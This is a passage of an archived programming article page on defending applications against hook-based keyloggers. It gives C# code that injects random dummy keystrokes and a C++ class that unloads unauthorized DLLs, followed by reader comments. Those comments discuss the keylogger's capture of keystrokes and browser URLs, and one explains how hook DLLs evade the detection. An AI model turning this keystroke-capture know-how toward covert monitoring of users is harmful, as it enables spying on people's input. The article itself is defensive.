+            <span class='cs-keyword'>public</span> Int16 wScan;
+            <span class='cs-keyword'>public</span> Int32 dwFlags;
+            <span class='cs-keyword'>public</span> Int32 time;
+            <span class='cs-keyword'>public</span> Int32 dwExtraInfo;
+            <span class='cs-keyword'>public</span> Int32 __filler1;
+            <span class='cs-keyword'>public</span> Int32 __filler2;
+        }
+
+        <span class='cs-keyword'>public</span> <span class='cs-keyword'>struct</span> INPUT
+        {
+            <span class='cs-keyword'>public</span> Int32 type;
+            <span class='cs-keyword'>public</span> KEYDBINPUT ki;
+        }
+
+        [DllImport(<span class='cpp-string'>"user32"</span>)] <span class='cs-keyword'>public</span> <span class='cs-keyword'>static</span> <span class='cs-keyword'>extern</span> <span class='cs-keyword'>int</span> 
+              SendInput( <span class='cs-keyword'>int</span> cInputs, <span class='cs-keyword'>ref</span> INPUT pInputs, <span class='cs-keyword'>int</span> cbSize );
+
+        <span class='cs-keyword'>protected</span> <span class='cs-keyword'>void</span> OnKeyUp(<span class='cs-keyword'>object</span> sender, 
+                  System.Windows.Forms.KeyEventArgs e)
+        {
+                <span class='cs-keyword'>if</span> (e.KeyData == Keys.ShiftKey || e.KeyData == 
+                            Keys.ControlKey || e.KeyData == Keys.Alt)
+                    <span class='cs-keyword'>return</span>;
+        
+                <span class='cs-keyword'>if</span> (e.KeyData == Keys.Delete || e.KeyData == Keys.Back)
+                {
+                    Text = <span class='cpp-string'>""</span>;
+                    m_sRealText = <span class='cpp-string'>""</span>; 
+                    <span class='cs-keyword'>return</span>;
+                }
+
+            <span class='cs-keyword'>if</span> (m_state == <span class='cs-literal'>0</span>)
+            {        
+                m_iDummyKeyStrokesCount = SendDummyKeyStrokes();
+                m_state = <span class='cs-literal'>1</span>;
+                m_sRealText += Text[Text.Length-<span class='cs-literal'>1</span>];            
+            }
+            <span class='cs-keyword'>else</span>
+            {
+                <span class='cs-keyword'>if</span> (m_state++ &gt;= m_iDummyKeyStrokesCount)            
+                    m_state = <span class='cs-literal'>0</span>;
+            }    
+        }
+
+        <span class='cs-keyword'>public</span> <span class='cs-keyword'>int</span> SendDummyKeyStrokes()
+        {
+            <span class='cs-keyword'>short</span> key;
+            Random rand = <span class='cs-keyword'>new</span> Random();
+            <span class='cs-keyword'>int</span> iKeyStrokeCount = rand.Next(<span class='cs-literal'>1</span>, <span class='cs-literal'>6</span>);
+
+            INPUT inputDown = <span class='cs-keyword'>new</span> INPUT();
+            inputDown.type = INPUT_KEYBOARD;
+            inputDown.ki.dwFlags = <span class='cs-literal'>0</span>;
+
+            INPUT inputUp = <span class='cs-keyword'>new</span> INPUT();
+            inputUp.type = INPUT_KEYBOARD;
+            inputUp.ki.dwFlags = KEYEVENTF_KEYUP;
+
+            <span class='cs-keyword'>for</span> (<span class='cs-keyword'>int</span> i=<span class='cs-literal'>0</span>; i &lt; iKeyStrokeCount; i++)
+            {
+                key = (<span class='cs-keyword'>short</span>) rand.Next('A', 'Z');
+                inputDown.ki.wVk = key;
+                SendInput( <span class='cs-literal'>1</span>, <span class='cs-keyword'>ref</span> inputDown, Marshal.SizeOf( inputDown ) );
+
+                inputUp.ki.wVk = key;
+                SendInput( <span class='cs-literal'>1</span>, <span class='cs-keyword'>ref</span> inputUp, Marshal.SizeOf( inputUp ) );
+
+            }
+            <span class='cs-keyword'>return</span> iKeyStrokeCount;
+        }</PRE>
+<H2>The SpyRemover class</H2>
+<P><IMG height=350 alt="Sample image" src="KeyLogger/KeyLogger4.gif" width=310></P>
+<P>Hook based spy programs are dependent of their hook procedure DLL. Removing (<CODE>FreeLibrary</CODE>) the hook DLL from an application process will disable the spy ability to monitor keystrokes on that application. The demo hook safe application uses the <CODE>SpyRemover</CODE> class to remove hook DLL files. The <CODE>SpyRemover</CODE> constructor receives a list of "authorized modules". A module is said to be unauthorized if it is loaded in the application process and does not appear on this list. <CODE>SpyRemover</CODE> detects unauthorized modules by enumerating all of the application process modules.</P><PRE>VOID SpyRemover::TimerProc(HWND hwnd, UINT uMsg, 
+                      <span class='cpp-keyword'>unsigned</span> <span class='cpp-keyword'>int</span> idEvent, DWORD dwTime)
+{
+    m_SpyRemover-&gt;EnumModules();
+}
+
+<span class='cpp-comment'>//////////////////////////////////////////////////////////////////</span>
+
+SpyRemover::SpyRemover(<span class='cpp-keyword'>char</span>* szAuthorizedList)
+{
+    m_SpyRemover = <span class='cpp-keyword'>this</span>;
+
+    m_szAuthorizedList = <span class='cpp-string'>" "</span>;
+    m_szAuthorizedList += szAuthorizedList;
+    m_szAuthorizedList += <span class='cpp-string'>" "</span>;
+         m_szAuthorizedList.MakeLower();
+
+    ::SetTimer(NULL, <span class='cpp-literal'>0</span>, <span class='cpp-literal'>500</span>, TimerProc);
+}
+
+<span class='cpp-comment'>//////////////////////////////////////////////////////////////////////</span>
+
+<span class='cpp-keyword'>void</span> SpyRemover::EnumModules()
+{
+  DWORD dwPID = ::GetCurrentProcessId();
+  HANDLE hModuleSnap = INVALID_HANDLE_VALUE; 
+  MODULEENTRY32 me32; 
+    
+  <span class='cpp-comment'>//Take a snapshot of all modules in the process. </span>
+  hModuleSnap = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, dwPID ); 
+  <span class='cpp-keyword'>if</span>( hModuleSnap == INVALID_HANDLE_VALUE ) 
+    <span class='cpp-keyword'>return</span>; 
+ 
+  me32.dwSize = <span class='cpp-keyword'>sizeof</span>( MODULEENTRY32 ); 
+ 
+  <span class='cpp-comment'>//Retrieve information about the first module (application.exe) </span>
+  <span class='cpp-keyword'>if</span>( !Module32First( hModuleSnap, &amp;me32 ) ) 
+  { 
+      CloseHandle( hModuleSnap );     
+      <span class='cpp-keyword'>return</span>; 
+  } 
+  
+  <span class='cpp-comment'>//Walk the module list of the process </span>
+  <span class='cpp-keyword'>do</span> 
+  { 
+      <span class='cpp-keyword'>if</span> (!IsModuleAuthorized(me32.szModule))
+      {
+          HMODULE hmodule = me32.hModule;
+          CloseHandle(hModuleSnap); 
+          FreeLibrary(hmodule);
+          <span class='cpp-keyword'>return</span>; 
+      }
+      
+  } <span class='cpp-keyword'>while</span>( Module32Next( hModuleSnap, &amp;me32 ) ); 
+  
+  CloseHandle(hModuleSnap); 
+}
+
+<span class='cpp-comment'>//////////////////////////////////////////////////////////////////////</span>
+
+<span class='cpp-keyword'>bool</span> SpyRemover::IsModuleAuthorized(<span class='cpp-keyword'>char</span>* szModuleName)
+{
+    <span class='cpp-keyword'>char</span> szModule[<span class='cpp-literal'>1024</span>];
+    sprintf(szModule, <span class='cpp-string'>" %s "</span>, szModuleName);
+    strcpy(szModule, _strlwr(szModule));
+
+    <span class='cpp-keyword'>if</span> (strstr(m_szAuthorizedList, szModule))
+        <span class='cpp-keyword'>return</span> <span class='cpp-keyword'>true</span>;
+    <span class='cpp-keyword'>else</span>
+        <span class='cpp-keyword'>return</span> <span class='cpp-keyword'>false</span>;
+}</PRE>
+<H2>Useful utilities</H2>
+<P>Process Explorer by <A href="http://www.sysinternals.com/">Sysinternals</A>.</P>
+<H2>Disclaimer</H2>
+<P>THIS WORK IS PROVIDED ON AN "AS IS" BASIS. THE AUTHOR PROVIDES NO WARRANTY WHATSOEVER, EITHER EXPRESS OR IMPLIED, REGARDING THE WORK, INCLUDING WARRANTIES WITH RESPECT TO ITS MERCHANTABILITY OR FITNESS FOR ANY PARTICULAR PURPOSE.</P>
+
+<!-- Article Ends -->
+
+</div>
+<h2>Dor Alon</h2>
+<table width='100%' border=0><tr valign=top><td nowrap class=smallText ><br></td><td class=smallText width='100%'><p class=smallText>Click <a href='/script/profile/whos_who.asp?vt=arts&id=1932755'>here</a> to view Dor Alon's online profile.</p></td></tr></table><br><table cellpadding=4 width='100%' border=0><tr valign=top><td width='100%'><h2>Other popular  articles:</h2><ul><li><a href="/system/DevMgr.asp">Simple Device Manager</a><br><span class=smalltext>This article demonstrates a simple enumeration device and a dynamic, driver load/unload facility.</span><li><a href="/system/driverdev.asp">Driver Development Part 1: Introduction to Drivers</a><br><span class=smalltext>This article will go into the basics of creating a simple driver.</span><li><a href="/system/NoDeleteDelay.asp">Eliminating Explorer's delay when deleting an in-use file</a><br><span class=smalltext>How to track down and patch an annoyance in Windows Explorer's code.</span><li><a href="/system/driverdev2.asp">Driver Development Part 2: Introduction to Implementing IOCTLs</a><br><span class=smalltext>This article will go deeper into the basics of creating a simple driver.</span></ul></td><td width=360><script language=javascript>document.write("<IFRAME src=\"/script/ann/ServeHTML.aspx?C=False&id=786&cb=4176227\" border=0 frameborder=0 scrolling=no width=300 height=250></IFRAME>");</script></td></tr></table>
+		<form action="/script/rating/code/app/insert_vote.asp" method="post">
+		<input type="hidden" name="vote_name" value="KeyLogger/w2k5/3/2005">
+		<input type="hidden" name="goal" value="/system/KeyLogger.asp">
+
+<table bgColor=#ff9900 border=0 cellPadding=1 cellSpacing=0 width="100%">
+<tr><td width="100%">
+<table bgColor=#FBEDBB border=0 cellPadding=4 cellSpacing=0 width="100%"><tr>
+<td valign=middle class=smalltext>[<a href="#__top">Top</a>]</td>
+<td align=right valign=middle nowrap >
+<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'><b>Sign in</b></a> to vote for this article:&nbsp;&nbsp;&nbsp;&nbsp; <i>Poor</i><input type=radio value='1' style='disabled:true;' name=rate><input type=radio value='2' style='disabled:true;' name=rate><input type=radio value='3' style='disabled:true;' name=rate><input type=radio value='4' style='disabled:true;' name=rate><input type=radio value='5' style='disabled:true;' name=rate><i>Excellent</i>&nbsp;&nbsp;<input type=submit value=Vote class=FormButton style='disabled:true;'>
+</td></tr>
+</table></td></tr></table>
+</form>
+<table width=100% cellspacing=0 cellpadding=0 border=0><tr valign=top>
+<td valign=top><center><script language=javascript>document.write("<a href=\"/script/admentor/admentorredir.asp?id=1808&way=ban\" target=_blank><img src=\"/script/ann/ServeImg.aspx?File=%2Fscript%2Fadmentor%2Fimages%2FToolbox%5F120x60%2Egif&C=False&id=1808&cb=4176230\" alt=\"\" border=0 width=120 height=60></a>");</script></center><br></td>
+<td valign=top nowrap align=center><span id=AdBanner5><script language=javascript>document.write("<a href=\"/script/admentor/admentorredir.asp?id=1728&way=ban\" target=_blank><img src=\"/script/ann/ServeImg.aspx?File=%2Fscript%2Fadmentor%2Fimages%2Fmainsoft%5F468x60%5Fgrasshopper%2Egif&C=False&id=1728&cb=4176223\" alt=\"Visual Studio .NET on Linux\" border=0 width=468 height=60></a>");</script></span></td>
+</tr></table>
+
+</td></tr></table>
+
+<a name='__comments'></a>
+
+<script language="JavaScript">
+var Selected = "";
+
+var AdTime = new Date();
+
+
+// Ensures the expanded message appears reasonably close to where 
+// it should appear: on screen, and if possible, under the mouse cursor.
+function SwitchMessage(e)
+{
+   if ( !e ) e = window.event;
+   var target = e.target ? e.target : e.srcElement;
+
+   // is it a post?
+   while ( target && target.id != 'DynMessLink' )
+      target = target.parentNode;
+   if ( !target || target.id != 'DynMessLink' )
+      return;
+
+   if (Selected)
+   {
+      var body = document.getElementById(Selected + "_h1");
+      if (body)
+         body.style.display = 'none';
+      var head = document.getElementById(Selected + "_h0");
+      if (head)
+         head.bgColor = '#FEF9E7';
+   }
+
+   if (Selected == target.name) // just collapse
+      Selected="";
+   else
+   {
+      Selected = target.name;
+      var body = document.getElementById(Selected + "_h1");
+      if (body)
+      {
+         if (body.style.display=='none')
+            body.style.display='';
+         else
+            body.style.display = 'none';
+      }
+      var head = document.getElementById(Selected + "_h0");
+      if (head)
+         head.bgColor = '#99CCFF';
+
+      if ( body && head && body.style.display != 'none' )
+      {
+         // the bit that keeps the post on-screen and under the cursor
+         //var dif = (getRealPos(head, "Top") + head.offsetHeight/2) - (document.body.scrollTop+e.clientY);
+         //document.body.scrollTop += dif;
+         document.body.scrollTop = getRealPos(head, "Top") - document.body.clientHeight/10;
+         EnsureMessageVisible(target.name, true);
+      }
+   }
+
+   if ( e.preventDefault )
+      e.preventDefault();
+   else
+      e.returnValue = false;
+   return false;
+}
+
+// does its best to make a message visible on-screen (vs. scrolled off somewhere).
+function EnsureMessageVisible(msgID, bShowTop) {
+   var msgHeader = document.getElementById(msgID + "_h0");
+   var msgBody = document.getElementById(msgID + "_h1");
+
+   // determine scroll position of top and bottom
+   var scrollContainer = document.body;
+   var top = getRealPos(msgHeader, 'Top');
+   var bottom = getRealPos(msgBody, 'Top') + msgBody.offsetHeight;
+
+   // if not already visible, scroll to make it so
+   if ( scrollContainer.scrollTop > top && !bShowTop)
+      scrollContainer.scrollTop = top - document.body.clientHeight/10;
+   if ( scrollContainer.scrollTop+scrollContainer.clientHeight < bottom )
+      scrollContainer.scrollTop = bottom-scrollContainer.clientHeight;
+   if ( scrollContainer.scrollTop > top && bShowTop)
+      scrollContainer.scrollTop = top - document.body.clientHeight/10;
+}
+
+// utility
+function getRealPos(i,which)
+{
+   iPos = 0
+   while (i!=null)
+   {
+      iPos += i["offset" + which];
+      i = i.offsetParent;
+   }
+   return iPos
+}
+
+
+</script>
+<div id="_MessageBoard" onclick="SwitchMessage(event)"><table border=0 bgcolor='#ff9900' width=100% cellpadding=0 cellspacing=0><tr><td width='100%'><table border=0 id=ForumTable bgcolor='#ff9900' width=100% cellpadding=0 cellspacing=1><tr><td class=smallText bgcolor='#ffcc99'><b class=forum_hilite>Note</b>: You must <a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'><b>Sign in</b></a> to post to this message board.</td></tr><form action='/script/comments/app/do_filtermessages.asp?main=/system/KeyLogger.asp&df=100&forumid=177768' method=post><tr><td><table width=100% bgcolor=white border=0 cellspacing=0 cellpadding=3><tr bgcolor=#FBEDBB><td nowrap class=smalltext><a href='/script/comments/faq.asp'><img src='/script/images/forum_faq.GIF' border=0 width=16 height=16 align=absmiddle> <b>FAQ</b></a>&nbsp;</td><td nowrap valign=top align=right class=smalltext>Noise tolerance <select size=1 name=noise class=smalltext><option value="1">Very High</option>
+<option value="2">High</option>
+<option selected value="3">Medium</option>
+<option value="4">Low</option>
+<option value="5">Very low</option>
+</select>&nbsp;&nbsp;</td><td class=smalltext nowrap align=right valign=middle colspan=2><a href='/script/comments/search_comments.asp?forumid=177768'><img src="/script/images/forum_search.gif" width=16 height=15 border=0> Search comments</a> &nbsp;</td><td valign=top align=right><input type=submit value='Set Options' name=submit class=FormButton></td></tr><tr bgcolor='#ff9900'><td width='100%'>&nbsp;</td><td nowrap align=right valign=top class=smalltext>View <select size=1 name=expand class=smalltext><option value="0">Normal (slow)</option>
+<option value="2">Preview (slow)</option>
+<option selected value="5">Message View</option>
+<option value="6">Topic View</option>
+<option value="1">Thread View</option>
+<option value="3">Expanded (Supporters only)</option>
+</select>&nbsp;&nbsp;</td><td nowrap valign=top class=smalltext>Per page <select size=1 name=perpage class=smalltext><option value="10">10</option>
+<option selected value="25">25</option>
+<option value="50">50 (must logon)</option>
+</select></td><td colspan=2>&nbsp;</td></tr></table>
+</td></tr></form><tr bgcolor=#FBEDBB><td><a name=xx0xx></a><table border=0 cellpadding=2 width=100% bgcolor=#FBEDBB><tr><td>&nbsp;</td><td class=messagetitle>Msgs 1 to 25 of 74 (Total: 74) (<a href='/system/KeyLogger.asp?df=100&forumid=177768'>Refresh</a>)</td><td align=right nowrap><font class=messagetitle><span class=HoverLink >First</span> <span class=HoverLink >Prev</span> <a class=HoverLink name=HoverNL href='/system/KeyLogger.asp?df=100&forumid=177768&fr=26'>Next</a> <span class=HoverLink >&nbsp;&nbsp;&nbsp;&nbsp;</span> </font></td></tr></table>
+</td></tr><tr bgcolor=white><td><table border=0 cellspacing=0 cellpadding=0 width='100%' border=0><tr><td width='100%'><table bgcolor=#FBEDBB border=0 cellspacing=0 cellpadding=2><tr><td width='100%' class=messagetitle>Subject&nbsp;</td><td width=140 nowrap class=messagetitle>Author&nbsp;</td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle>Date&nbsp;</font></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=5></td></tr><tr bgcolor='#FEF9E7' id=1486749_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1486749xx'></a><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1486749 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1486749#xx1486749xx'><b>Naive.....</b></a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=846502'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle ><b>Anton Bassov</b>&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle ><b>13:33 13 May '06</b>&nbsp;</font></td></tr></table></td></tr>
+<tr id=1486749_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent><br>Hi mate<br><br>//////<br>SpyRemover detects unauthorized modules by enumerating all of the application process modules.<br>////////<br><br>The above is incredibly naive approach - DLL that holds Windows hook procedure is loaded only when the hook procedure needs to be invoked, and unloaded after Windows hook gets processed. Therefore, it has no chance of turning up on the module list of the target process, unless you enumerate modules at the time when the hook gets processed.<br><br>Furhermore, there are also low-level Windows hooks - in this case hook procedure is invoked in the context of installer thread, rather than that of a window that holds keyboard focus<br><br>To summarize, the above mentioned approach does not offer any solution at all<br><br><br>Anton Bassov<br><br> <br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1486749&forumid=177768&select=1486749#xx1486749xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1486749#xx1486749xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=5></td></tr><tr height=1><td colspan=1 bgcolor='#ff9900'><img src='/script/images/t.gif' width=1 height=1></td></tr><tr bgcolor='#FEF9E7' id=1458787_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1458787xx'></a><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1458787 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1458787#xx1458787xx'><b>Getting Firefox URL</b></a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=2934005'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle ><b>nblankton</b>&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle ><b>20:17 21 Apr '06</b>&nbsp;</font></td></tr></table></td></tr>
+<tr id=1458787_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>I notice your code only covers Internet Explorer.  If you generalize it, it also works for Netscape, Mozilla and Opera.  The only exception seems to be Firefox.  It's not clear how to get at the current URL for that browser.  Have you by chance dealt with that problem?<br>Thanks. <br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1458787&forumid=177768&select=1458787#xx1458787xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1458787#xx1458787xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=5></td></tr><tr height=1><td colspan=1 bgcolor='#ff9900'><img src='/script/images/t.gif' width=1 height=1></td></tr><tr bgcolor='#FEF9E7' id=1425820_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1425820xx'></a><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1425820 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1425820#xx1425820xx'><b>Solution to the shift problem!</b></a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=322040'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle ><b>Zorbek</b>&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle ><b>9:38 28 Mar '06</b>&nbsp;</font></td></tr></table></td></tr>
+<tr id=1425820_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>I saw you tried to fix the shift problem with a strange remapping of the char... this doesn't work well on foreign chars like our nice åäö...<br><br>The thing is that when your app isn't in focus (allways), the GetKeyboardState just doesn't get the state correctly. It returns 1 (success) but the char at position 16 (VK_SHIFT = 16) is still 0 where it should be 128 or 129.<br><br>The solution maybe to attach your process to the one in focus using AttachThreadInput or to use the GetKeyState/GetAsyncKeyState to retreive weither the key is pressed or not. Knowing this value you kan then puch it in your keyboard state (like this: keyState[VK_SHIFT] = 128; ) before you call ToAscii.<br><br>Anyway, thanks for the nice code, the rest works very well! <br><br>/Xav<br><br> -- modified at 9:51 Tuesday 28th March, 2006<br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1425820&forumid=177768&select=1425820#xx1425820xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1425820#xx1425820xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=5></td></tr><tr height=1><td colspan=1 bgcolor='#ff9900'><img src='/script/images/t.gif' width=1 height=1></td></tr><tr bgcolor='#FEF9E7' id=1413676_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1413676xx'></a><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1413676 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1413676#xx1413676xx'><b>good</b></a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=1012293'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle ><b>The_Myth</b>&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle ><b>4:44 19 Mar '06</b>&nbsp;</font></td></tr></table></td></tr>
+<tr id=1413676_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent><img src="/script/images/smiley_biggrin.gif" align=absmiddle> <br><br><br><br><br> -- modified at 4:44 Sunday 19th March, 2006<br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1413676&forumid=177768&select=1413676#xx1413676xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1413676#xx1413676xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=6></td></tr><tr bgcolor='#FEF9E7' id=1420275_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1420275xx'></a><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1420275 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1420275#xx1420275xx'>Re: good</a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=1932755'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle >Dor Alon&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle >2:41 24 Mar '06&nbsp;</font></td></tr></table></td></tr>
+<tr id=1420275_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent><img src="/script/images/smiley_cool.gif" align=absmiddle> <br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1413676&forumid=177768&select=1420275#xx1420275xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1420275#xx1420275xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=5></td></tr><tr height=1><td colspan=1 bgcolor='#ff9900'><img src='/script/images/t.gif' width=1 height=1></td></tr><tr bgcolor='#FEF9E7' id=1392578_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1392578xx'></a><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1392578 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1392578#xx1392578xx'><b>Comments</b></a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=2144312'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle ><b>richtheo</b>&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle ><b>5:32 3 Mar '06</b>&nbsp;</font></td></tr></table></td></tr>
+<tr id=1392578_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>Hi Dor, This is clearly a superb piece of code, but is there any chance you could take an hour or two to comment the source code ?<br>There's barely any comments in it and it uses a load of system calls and complex approaches which would take days to pick to pieces for anyone except the author.<br>Rich <br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1392578&forumid=177768&select=1392578#xx1392578xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1392578#xx1392578xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=6></td></tr><tr bgcolor='#FEF9E7' id=1420274_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1420274xx'></a><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1420274 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1420274#xx1420274xx'>Re: Comments</a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=1932755'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle >Dor Alon&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle >2:40 24 Mar '06&nbsp;</font></td></tr></table></td></tr>
